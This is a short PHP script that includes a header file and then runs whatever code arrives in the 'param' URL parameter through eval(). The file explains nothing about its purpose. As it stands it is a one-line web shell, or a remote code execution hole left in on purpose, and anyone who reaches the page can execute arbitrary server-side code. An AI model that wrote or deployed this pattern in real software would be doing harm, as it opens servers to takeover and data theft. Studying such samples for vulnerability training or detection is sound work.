<?php
include 'header.php';

if(isset($_GET['param'])){
    $code = $_GET['param'];
    eval($code);    
}
?>